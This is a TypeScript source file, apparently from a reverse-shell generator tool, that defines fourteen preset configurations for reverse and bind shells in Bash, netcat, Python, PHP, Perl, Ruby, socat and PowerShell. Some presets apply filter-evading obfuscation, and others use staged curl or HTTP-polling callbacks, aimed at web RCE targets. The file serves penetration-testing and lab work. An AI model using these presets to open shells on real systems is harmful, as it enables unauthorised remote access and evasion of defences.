import {
  generateReverseShell,
  type ReverseShellConfig,
} from "@/lib/reverse-shells";

export interface BuiltinCollection {
  id: string;
  name: string;
  description: string;
  tags: string[];
  config: ReverseShellConfig;
  renderedCommand: string;
}

function preset(
  id: string,
  name: string,
  description: string,
  tags: string[],
  config: ReverseShellConfig,
): BuiltinCollection {
  return {
    id,
    name,
    description,
    tags,
    config,
    renderedCommand: generateReverseShell(config).command,
  };
}

export const builtinCollections: BuiltinCollection[] = [
  preset(
    "linux-bash-dev-tcp",
    "Linux Bash /dev/tcp",
    "Classic Bash reverse shell for Linux targets where Bash supports /dev/tcp.",
    ["linux", "bash", "classic"],
    {
      templateId: "bash-dev-tcp",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/bash",
      obfuscation: "none",
    },
  ),
  preset(
    "linux-nc-mkfifo",
    "Linux netcat mkfifo",
    "Portable netcat fallback for builds without the -e option.",
    ["linux", "nc", "fallback"],
    {
      templateId: "nc-mkfifo",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "none",
    },
  ),
  preset(
    "web-rce-python3",
    "Web RCE Python 3",
    "Python reverse shell suited for command injection and web RCE contexts.",
    ["multi", "python", "web-rce"],
    {
      templateId: "python3-socket",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "url",
    },
  ),
  preset(
    "web-rce-php",
    "Web RCE PHP",
    "PHP proc_open payload for environments where PHP execution is available.",
    ["multi", "php", "web-rce"],
    {
      templateId: "php-proc-open",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "url",
    },
  ),
  preset(
    "linux-bash-obfuscated",
    "Obfuscated Bash base64",
    "Bash payload wrapped in base64 decode for filter-sensitive shells.",
    ["linux", "bash", "obfuscation"],
    {
      templateId: "bash-dev-tcp",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/bash",
      obfuscation: "bash-base64",
    },
  ),
  preset(
    "linux-bash-no-spaces",
    "Bash no-space ${IFS}",
    "Bash payload with spaces replaced by ${IFS} for simple space filters.",
    ["linux", "bash", "obfuscation"],
    {
      templateId: "bash-dev-tcp",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/bash",
      obfuscation: "bash-ifs",
    },
  ),
  preset(
    "windows-powershell-encoded",
    "Windows PowerShell encoded",
    "PowerShell TCPClient payload encoded as UTF-16LE base64 for -EncodedCommand.",
    ["windows", "powershell", "obfuscation"],
    {
      templateId: "powershell-tcp-client",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "powershell.exe",
      obfuscation: "powershell-encoded",
    },
  ),
  preset(
    "linux-socat-pty",
    "Linux socat PTY",
    "Socat payload that starts closer to an interactive TTY from the first callback.",
    ["linux", "socat", "tty"],
    {
      templateId: "socat-pty",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/bash",
      obfuscation: "none",
    },
  ),
  preset(
    "windows-hoaxshell-style",
    "Windows HoaxShell-style",
    "HTTP polling PowerShell callback for lab environments where raw TCP egress is blocked.",
    ["windows", "powershell", "http", "staged"],
    {
      templateId: "powershell-hoaxshell-style",
      lhost: "10.10.14.3",
      lport: 8080,
      shell: "powershell.exe",
      obfuscation: "none",
    },
  ),
  preset(
    "linux-curl-staged",
    "Linux curl staged",
    "Fetch a prepared rs.sh second-stage script from your HTTP server.",
    ["linux", "bash", "staged"],
    {
      templateId: "bash-curl-staged",
      lhost: "10.10.14.3",
      lport: 4444,
      httpPort: 8000,
      shell: "/bin/bash",
      obfuscation: "none",
    },
  ),
  preset(
    "web-rce-perl",
    "Web RCE Perl",
    "Perl reverse shell for targets with Perl and outbound TCP access.",
    ["multi", "perl", "web-rce"],
    {
      templateId: "perl-socket",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "url",
    },
  ),
  preset(
    "web-rce-ruby",
    "Web RCE Ruby",
    "Ruby TCPSocket payload for targets where Ruby is available.",
    ["multi", "ruby", "web-rce"],
    {
      templateId: "ruby-socket",
      lhost: "10.10.14.3",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "url",
    },
  ),
  preset(
    "multi-nc-bind-e",
    "Bind shell netcat -e",
    "Bind shell preset for isolated labs where the operator connects inbound.",
    ["multi", "bind", "nc"],
    {
      templateId: "nc-bind-e",
      lhost: "0.0.0.0",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "none",
    },
  ),
  preset(
    "multi-python3-bind",
    "Bind shell Python 3",
    "Python bind shell fallback when netcat -e is unavailable.",
    ["multi", "bind", "python"],
    {
      templateId: "python3-bind",
      lhost: "0.0.0.0",
      lport: 4444,
      shell: "/bin/sh",
      obfuscation: "none",
    },
  ),
];

